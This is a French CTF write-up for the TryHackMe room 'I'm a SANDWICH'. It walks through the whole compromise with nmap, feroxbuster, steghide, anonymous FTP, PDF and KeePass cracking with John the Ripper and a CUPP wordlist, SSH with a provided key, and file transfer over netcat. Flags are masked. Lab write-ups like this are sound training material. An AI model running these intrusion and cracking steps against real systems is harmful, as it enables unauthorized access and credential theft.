---
title: "CTF - I'm a SANDWICH"
date: 2026-02-15
categories: [tryhackme]
tags: [webexploitation, ftp, steganography, keepass, privilege-escalation]
image: /assets/img/writeups/sandwich/background.png
---


### Introduction

Cette room proposée sur TryHackMe met en scène Mr.Sandwich, dont les différents “ingrédients” ont été dispersés sur une machine vulnérable. L’objectif est de les retrouver en effectuant une analyse méthodique du système cible.

Comme dans tout test d’intrusion, la première étape consiste à réaliser une phase d’énumération afin d’identifier les ports ouverts et les services exposés, puis à obtenir un accès initial et élever les privilèges jusqu’à la compromission complète de la machine.

---

### Phase d’énumération

Scan Nmap :

```bash
$ nmap -T4 -n -sC -sV -Pn -p- 10.64.180.126

# Nmap 7.98 scan initiated Sat Feb 14 17:10:14 2026 as: /usr/lib/nmap/nmap -T4 -p- -Pn -sC -sV -Pn -oN scan_nmap.txt 10.64.180.126
Nmap scan report for 10.64.180.126
Host is up (0.11s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
21/tcp   open  ftp             vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.188.84
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              15 Feb 09 18:13 salad.txt
|_-rw-r--r--    1 1000     1000        16337 Feb 09 18:33 tomato.pdf
22/tcp   open  ssh             OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 5f:c9:95:09:0a:4d:a3:89:62:27:6f:27:be:1c:24:ff (ECDSA)
|_  256 5d:e2:56:c5:81:8e:a4:8d:48:ea:e4:bb:a6:5b:bb:4b (ED25519)
80/tcp   open  http            Apache httpd 2.4.66 ((Debian))
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: I'm a sad SANDWICH
1300/tcp open  h323hostcallsc?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Hello, I'm a SANDWICH.
|     lost my ingredients...
|     give me the codes for my ingredients, I'll give you flags.
|     Hmm... this code tastes wrong.
|   NULL, RPCCheck: 
|     Hello, I'm a SANDWICH.
|     lost my ingredients...
|_    give me the codes for my ingredients, I'll give you flags.
1 service unrecognized despite returning data. If you know the service/version,
... 
```
`-T4` : augmente la vitesse du scan (mode agressif)  
`-n` : désactive la résolution DNS pour accélérer le scan  
`-sC` : exécute les scripts par défaut  
`-sV` : détecte les versions des services  
`-Pn` : ignore le ping initial (utile si l’hôte bloque les ICMP)  
`-p-` : scanne l’ensemble des 65535 ports  
 

Ce scan permet d’obtenir une vue complète des services accessibles sur la machine.

<u>Il y a 4 ports ouverts :</u>

- **21 (FTP)**  
  L’authentification anonyme est autorisée. Deux fichiers intéressants sont accessibles : `salad.txt` et `tomato.pdf`.

- **22 (SSH)**  
  Service SSH actif, pouvant potentiellement être exploité si des identifiants sont découverts.

- **80 (HTTP)**  
  Serveur web Apache accessible, à analyser pour d’éventuelles informations supplémentaires.

- **1300 (Service personnalisé)**  
  Service semblant permettre l’envoi de codes correspondant aux ingrédients.

---

Je commence par analyser le service HTTP exposé sur le port 80, les applications web étant souvent un point d’entrée privilégié lors d’un test d’intrusion.

---

### Web exploitation

En accédant au site web, un message indique que *Mr. Sandwich* a besoin d’aide pour retrouver ses quatre ingrédients perdus.

![Aperçu du site](/assets/img/writeups/sandwich/web.png)

Après une première analyse visuelle du site, j’utilise **Feroxbuster** afin de rechercher des répertoires et fichiers cachés :

```bash
$ feroxbuster -u http://10.64.180.126 
                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.64.180.126/
 🚩  In-Scope Url          │ 10.64.180.126
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w      315c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       29w      318c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       29w      355c http://10.64.180.126/images => http://10.64.180.126/images/
200      GET       90l      517w    52041c http://10.64.180.126/images/I_m_a_sad_SANDWICH.jpg
200      GET       78l      172w     1770c http://10.64.180.126/
301      GET        9l       29w      360c http://10.64.180.126/ingredients => http://10.64.180.126/ingredients/
200      GET        1l        1w        8c http://10.64.180.126/ingredients/cheese.html
200      GET        1l        1w        8c http://10.64.180.126/ingredients/tomato.html
200      GET        1l        1w        8c http://10.64.180.126/ingredients/salad.html
200      GET        1l        1w       15c http://10.64.180.126/ingredients/bacon.html
[#################>--] - 59s    25703/30009   10s     found:8       errors:0  
...

```
L’outil révèle plusieurs éléments intéressants : 

- `/image` :
- `/ingredients` :
- Plusieurs fichiers dans `/ingredients`
    - `cheese.html`
    - `tomato.html`
    - `salad.html`
    - `bacon.html`

Après avoir consulter chaque page html, le fichier bacon.html contient le premier code associé à un ingrédient, contrairement aux autres fichiers qui affichent simplement le message “missing”.
![Aperçu du site](/assets/img/writeups/sandwich/code.png)

Le répertoire `/image/` contient une image nommée `I_m_a_sad_SANDWICH.jpg`.  
Je télécharge alors le fichier afin de l’analyser plus en détail.  
Dans un premier temps, je vérifie ses métadonnées, mais aucune information intéressante n’est révélée.

Je contrôle ensuite l’intégrité du fichier en examinant son en-tête hexadécimal :
```bash
$ xxd I_m_a_sad_SANDWICH.jpg | head

00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......
00000010: 0001 0000 ffdb 0043 0005 0304 0404 0305  .......C........
00000020: 0404 0405 0505 0607 0c08 0707 0707 0f0b  ................
00000030: 0b09 0c11 0f12 1211 0f11 1113 161c 1713  ................
00000040: 141a 1511 1118 2118 1a1d 1d1f 1f1f 1317  ......!.........
00000050: 2224 221e 241c 1e1f 1eff db00 4301 0505  "$".$.......C...
```
Les premières lignes affichent la signature `JFIF`, confirmant qu’il s’agit bien d’un fichier JPEG valide.

Etant donné le contexte du challenge, j’envisage la possibilité de stéganographie (dissimulation de données dans une image). J’utilise donc steghide pour tenter d’extraire un contenu caché :

```bash
$ steghide extract -sf I_m_a_sad_SANDWICH.jpg

Entrez la passphrase: 
Ecriture des donnees extraites dans cheese.txt.
```
La commande `extract`  permet d’extraire un contenu caché dans un fichier, et tandis que l’option `-sf` tandis que l’option -sf spécifie le fichier à analyser.

<span style="color:#00ff99;">CODE : R6xxxxxxxxxxxx</span>

### FTP exploitation

Après avoir analysé le site web, je me suis intéressé au service FTP ouvert sur le port 21. Le scan Nmap avait révélé que l’authentification anonyme était autorisée :

```bash
$ ftp 10.64.180.126 
                 
Connected to 10.64.180.126.
220 (vsFTPd 3.0.3)
Name (10.64.180.126:opium): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||46625|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              15 Feb 09 18:13 salad.txt
-rw-r--r--    1 1000     1000        16337 Feb 09 18:33 tomato.pdf
226 Directory send OK.
ftp> get salad.txt
...
226 Transfer complete.
ftp> get tomato.pdf
...
226 Transfer complete.
ftp> exit
221 Goodbye.
```

<u>Analyse des fichiers obtenus :</u> 

Le fichier `salad.txt`  est lisible directement et contient un code associé à l’ingrédient *salad.* En revanche le fichier tomato.pdf est protégé par un mot de passe.

Afin de contourner cette protection, j’extrais d’abord le hash du PDF à l’aide de `pdf2john`: 

```bash
$ pdf2john tomato.pdf > hash.txt
```

Puis j’utilise John the Ripper avec le dictionnaire *rockyou.txt*  pour tenter un bruteforce :
```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
SANDWICH         (tomato.pdf)     
1g 0:00:00:33 DONE (2026-02-14 18:46) 0.03022g/s 322151p/s 322151c/s 322151C/s SANGEET..SANDRY-6
Use the --show --format=PDF options to display all of the cracked passwords reliably
Session completed.
```
![Aperçu du site](/assets/img/writeups/sandwich/pdf.png)
- `PASSWORD : SANDWICH`
- <span style="color:#00ff99;">CODE : 7zxxxxxxxxxxxx</span>
- <span style="color:#00ff99;">CODE : hPxxxxxxxxxxxx</span>

### Interaction avec le service sur port 1300

Après avoir récupéré les quatre codes associés aux ingrédients (bacon, cheese, salad et tomato), je me suis connecté au service personnalisé fonctionnant sur le port 1300 à l’aide de Netcat :

```bash
$ nc 10.64.180.126 1300

🥪 Hello, I'm a SANDWICH.
I lost my ingredients...
So, if you give me the codes for my ingredients, I'll give you flags.

> XXXXXXXXXXXXXX
Ah! My bacon!
Here is your flag: THM{XXXXXXXXXXXXXXXXXXXX}

> XXXXXXXXXXXXXX
Ah! My cheese!
Here is your flag: THM{XXXXXXXXXXXXXXXXXXXX}

> XXXXXXXXXXXXXX
Ah! My salad!
Here is your flag: THM{XXXXXXXXXXXXXXXXXXXX}

> XXXXXXXXXXXXXX
Ah! My tomato!
Here is your flag: THM{XXXXXXXXXXXXXXXXXXXX}

You've found the first four ingredients. Can you come to my house to help me find the last one?
I'll give you the keys to my house.

-----BEGIN OPENSSH PRIVATE KEY-----
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-----END OPENSSH PRIVATE KEY-----

```

Après soumission des quatre codes, le service fournit les flags correspondants ainsi qu’une clé privée SSH permettant d’accéder à l’étape suivante.

### Connexion SSH

Après avoir récupéré la clé privée fournie par le service du port `1300` , je l’enregistre dans un fichier nommé `id_rsa` . Avant toute utilisation, il est nécessaire de modifier ses permissions, sans quoi SSH refusera de l’utiliser : 

```bash
$ chmod 600 id_rsa 
```

Cette étape restreint l’accès au fichier de l’utilisateur courant, ce qui est requis pour des raisons de sécurité.

L’énoncé mentionne un utilisateur nommé **guest** , ce qui correspond logiquement au fait que nous sommes invités chez *Mr.Sandwich.*

Je construis donc la commande SSH suivante : 

- `guest@10.64.180.126` : utilisateur et hôte cible
- `-i id_rsa` : spécifie la clé privée à utiliser pour l'authentification.

La connexion s’effectue alors sans mot de passe, en utilisant la clé privée précédemment obtenue.

```
$ ssh guest@10.64.180.126 -i id_rsa
        
The authenticity of host '10.64.180.126 (10.64.180.126)' can't be established.
ED25519 key fingerprint is: SHA256:dgYvTfXELgLo2rvqVzbDZKi5BbRSlUIZe+JU8K15HL4
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added "10.64.180.126" (ED25519) to the list of known hosts.
Linux debian 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Feb 11 22:47:33 2026 from 192.168.0.19
guest@debian:~$ whoami
guest
```

### Investigation post-connexion

Après m’être connecté en tant qu’utilisateur **guest**, je commence par inspecter mes permissions. Je constate rapidement que je n’ai pas les droits suffisants pour certaines opérations. 

Je liste ensuite le contenu du répertoire courant et tombe sur un fichier `README.txt`.

Dans ce fichier, *Mr.Sandwich* exprime son attachement aux invités. Le message fait référence à un certain personnage nommé *Pancake,* suggérant ainsi d’explorer le répertoire `/home`
![Aperçu du site](/assets/img/writeups/sandwich/post-exploitation.png)

En explorant le dossier `/home/pancake`, j’ai constaté que j’avais des droits de lecture sur plusieurs fichiers, dont deux particulièrement intéressants : `note.txt` et `.hidden_note.txt` .

Le contenu de ces fichiers révèle la situation de Pancake, qui est emprisonné dans la maison de Mr. Sandwich. Pancake décrit *Mr. Sandwich* comme une personne obsessionnelle et auto-centrée, retenant Pancake en captivité et cachant quelque chose d’important dans une chambre à l’étage, protégée par un coffre-fort.

Pancake confie également qu’il possède la clé de ce coffre, mais ne peut accéder à la chambre. Il laisse un message secret dans `.hidden_note.txt`, encourageant à le venger en utilisant son compte utilisateur, nommé *pancake*, et en exploitant ses informations.

- **Information récupérée :**
    
    PASSWORD - *pancake* : `MY_FRIEND_PANCAKE`
    

<u>Passage à l’utilisateur pour accéder  à la chambre de Sandwich :</u>

D’après les indices, le coffre et la clé  sont dans le répertoire de *sandwich,* mais en tant qu’utilisateur guest, je ne dispose pas des permissions nécessaires pour accéder à ce dossier.

Il est donc nécessaire de se connecter avec le compte pancake pour poursuivre l’exploration et tenter d’ouvrir la chambre verrouillée.

```shell
guest@debian:/home/pancake$ su pancake 
Password: 
pancake@debian:~$ cd /home/sandwich/
pancake@debian:/home/sandwich$ groups
pancake chamber_key
pancake@debian:/home/sandwich$ ls -la
total 36
drwxr-xr-x 6 sandwich sandwich        4096 Feb 10 20:24 .
drwxr-xr-x 5 root     root            4096 Feb  9 21:58 ..
-rw------- 1 sandwich sandwich           0 Feb 11 22:45 .bash_history
-rw-r--r-- 1 sandwich sandwich         220 Feb  9 16:58 .bash_logout
-rw-r--r-- 1 sandwich sandwich        3526 Feb  9 16:58 .bashrc
drwxr-x--- 2 sandwich cave_key        4096 Feb 10 20:24 cave
drwxr-x--- 2 sandwich chamber_key     4096 Feb 11 22:40 chamber
drwxr-x--- 2 sandwich kitchen_key     4096 Feb 10 20:24 kitchen
drwxr-x--- 2 sandwich living_room_key 4096 Feb 10 20:24 living_room
-rw-r--r-- 1 sandwich sandwich         807 Feb  9 16:58 .profile
pancake@debian:/home/sandwich$ cd chamber/
pancake@debian:/home/sandwich/chamber$ ls -la
total 12
drwxr-x--- 2 sandwich chamber_key 4096 Feb 11 22:40 .
drwxr-xr-x 6 sandwich sandwich    4096 Feb 10 20:24 ..
-rwxr-xr-x 1 sandwich sandwich    2334 Feb 11 22:39 sandwich_.kdbx
pancake@debian:/home/sandwich/chamber$ 

```
Après être passé en utilisateur *pancake* via la commande `su pancake` , j’ai vérifié les groupes auxquels il appartient, et celui-ci m’a confirmé que *pancake*  fait partie du groupe `chamber_key` , lui donnant accès au répertoire `/home/sandwich/chamber` , comme indiqué précédemment dans les notes.

Je me suis donc déplacé dans ce répertoire et j’y ai découvert un fichier nommé `sandwich_.kdbx` . 


> 💡 Ce fichier est une base de données chiffrée au format KeePass (`.kdbx`), utilisée comme coffre-fort pour stocker des mots de passe. Son accès est protégé par un mot de passe maître.


Pour pouvoir tenter de déchiffrer ce fichier, il est nécessaire de le transférer vers ma machine d’attaque. J’utilise Netcat (**nc**) pour établir un transfert de fichier simple entre la machine cible et mon hôte.

- Sur la machine cible :
    
    ```bash
    $ nc -lnvp 4444 < sandwich_.kdbx
    ```
    
    - `-l` : Lance Netcat en mode écoute (serveur)
    - `-n` : Désactive la résolution DNS pour plus de rapidité
    - `-v` : Mode verbeux, affiche les connexions entrantes
    - `-p 4444` : écoute sur le port 4444
    - `< sandwich_.kdbx` : redirige le contenu du fichier vers la sortie standard, qui sera envoyée au client connecté
    
- Sur la machine d’attaque (locale) :
    
    ```bash
    $ nc -nv 10.64.180.126 4444 > sandwich_.kdbx
    ```
    
    - `-n` : désactive la résolution DNS
    - `-v` : Mode verbeux, pour poursuivre la connexion
    - `10.64.180.126 4444` : adresse IP et port de la machine cible écoutant
    - `> sandwich_.kdbx` : redirige la sortie standard vers un fichier local nommé `sandwich_.kdbx`

### Attaque de la base KeePass

Après avoir récupéré le fichier `sandwich_.kdbx` sur ma machine locale, j’ai tenté d’en extraire le hash afin de pouvoir effectuer une attaque par dictionnaire.

Pour cela, j’ai utilisé l’outil `keepass2john`, qui permet de convertir une base KeePass en un format exploitable par John the Ripper :

```bash
$ keepass2john sandwich_.kdbx > hash.txt
```

Le hash généré est alors enregistré dans le fichier `hash.txt`.

J’ai ensuite lancé une attaque par dictionnaire avec John :

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

J’ai testé plusieurs dictionnaires courants (par exemple `rockyou.txt` et d’autres listes de mots de passe communes), mais aucun ne permettait de retrouver le mot de passe de la base KeePass.

<u>Exploitation de l’indice :</u>

Face à ces échecs, j’ai consulté l’indice fourni dans l’énoncé, qui indiquait :

“*Mr. Sandwich_ likes to drink a cupp of tea with his friend*.”

Le mot `“cupp”` a immédiatement attiré mon attention. Il fait référence à l’outil CUPP (Common User Passwords Profiler), qui permet de générer un dictionnaire personnalisé à partir d’informations connues sur une cible.

J’ai donc utilisé `CUPP` en mode interactif :
```shell
$ cupp -i


  cupp.py!                  # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Sandwich_
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name: pancake
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: 
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to sandwich_.txt, counting 3480 words.
[+] Now load your pistolero with sandwich_.txt and shoot! Good luck!
```
- `-i` : Cette option permet de répondre à une séries de question afin de générer une wordlist personnalisée.


J’y ai renseigné les informations connues, notamment :  
- Le nom : Sandwich_ 
- Son ami : Pancake  

L’outil a alors généré un dictionnaire (`sandwich_.txt`) contenant différentes combinaisons basées sur ces informations.
J’ai ensuite relancé John the Ripper avec ce dictionnaire personnalisé :
```bash
$ john --wordlist=sandwich_.txt hash.txt  
                 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 10000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
54ndw1ch_47      (sandwich_)     
1g 0:00:00:00 DONE (2026-02-14 21:33) 1.960g/s 1317p/s 1317c/s 1317C/s 54ndw1ch_28..54ndw1ch_49
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Cette fois-ci, le mot de passe de la base KeePass a été correctement retrouvé.

`PASSWORD : 54ndw1ch_47`

Ouverture de la base KeePass : 

Après avoir récupéré le mot de passe du fichier `sandwich_.kdbx` , j’ai pu ouvrir la base KeePass directement depuis la machine cible à l’aide de la commande suivante :

```bash
$ keepassxc-cli open sandwich_.kdbx

sandwich> show
sandwich> ls
In my mind...
sandwich> show "In my mind..."
Title: In my mind...
UserName: 
Password: PROTECTED
URL: 
Maximum depth of replacement has been reached. 
Entry uuid: {639fc847-a990-4328-9fc2-dcf862b4d6f1}
Notes: My family disappeared... my FRIENDS disappeared. XX sandwiches had to disappear before I knew how to escape...

All I wanted was a friend, but if youre reading this, its because Ive become the jailer I tried to escape from.

And Im tired of running away, you can leave. But Im going on the offensive. Im going to destroy this bakery that gave birth to all my brothers, before throwing them out to be torn apart by pimply teenagers.

Im going to take everything from him, his image, his money, and everything he owns... starting with his website.

Take your flag and go away: THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXX}
Uuid: {639fc847-a990-4328-9fc2-dcf862b4d6f1}
Tags: 
sandwich>
```

Cette commande permet **d’ouvrir une base de données KeePass (.kdbx)** en mode interactif via le terminal.

- `keepassxc-cli` : version en ligne de commande de KeePassXC
- `open` : ouvre une base de données
- `sandwich_.kdbx` : fichier cible

Le programme m’a alors demandé le mot de passe maître, que j’ai fourni une fois connecté à la base, un prompt interactif s’est ouvert, me permettant d’exécuter différentes commandes pour explorer son contenu.

Afin de visualiser les entrées présentes dans la base, j’ai utilisé la commande `ls`,
une entrée nommée “In my mind…” est apparue, j’ai ensuite utilisé la commande `show` pour afficher son contenu : `show "In my mind..."` , l’entrée contenait un message narratif révélant la psychologie instable de Mr. Sandwich ainsi que le flag final du challenge

<span style="color:#00ff99;">FLAG : THM{bhXXXXXXXXXXXXXXXXXXXXXXXXXX}</span>

Réponse au dernière question du CTF : 

1. “*What is the number of rounds used by the KeePass KDF ?*”
    
    Sur ma machine locale j’ai utilisé la commande suivante : 
    
    ```bash
    $ pancake@debian:/home/sandwich/chamber$ keepassxc-cli db-info sandwich_.kdbx
    
    Enter password to unlock sandwich_.kdbx: 
    UUID: {e4b2cc32-d83f-45b5-8b7f-c1ab2aaeff62}
    Name: sandwich
    Description: In my mind...
    Cipher: AES 256-bit
    KDF: AES (XXXXX rounds)
    Recycle bin is enabled.
    Location: sandwich_.kdbx
    Database created: 10/02/2026 20:14
    Last saved: 11/02/2026 22:39
    Unsaved changes: no
    Number of groups: 1
    Number of entries: 1
    Number of expired entries: 0
    Unique passwords: 0
    Non-unique passwords: 0
    Maximum password reuse: 0
    Number of short passwords: 0
    Number of weak passwords: 0
    Entries excluded from reports: 0
    Average password length: 0 character(s)
    ```
    
    Cette commande permet d’afficher **les informations techniques de la base KeePass**, sans l’ouvrir en mode interactif.
    
2. “*Is it secure ? (yea/nay)*”
    
    > 💡Les tours servent à **ralentir volontairement le calcul** pour rendre les attaques par force brute beaucoup plus difficiles.
    
    Si le nombre de tours est trop faible, le mot de passe peut être cracké rapidement.
    
    Réponse : <span style="color:#00ff99;">nXX</span>


